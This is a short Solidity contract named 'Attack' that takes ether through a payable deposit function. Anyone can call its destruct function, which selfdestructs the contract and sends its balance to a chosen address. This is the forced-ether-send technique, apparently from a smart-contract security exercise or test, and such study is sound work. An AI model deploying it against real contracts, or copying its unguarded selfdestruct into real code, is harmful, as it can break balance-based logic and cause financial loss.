// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    event Received(address, uint256);

    function deposit() external payable {
        emit Received(msg.sender, msg.value);
    }

    function destruct(address payable _to) external {
        selfdestruct(_to);
    }
}
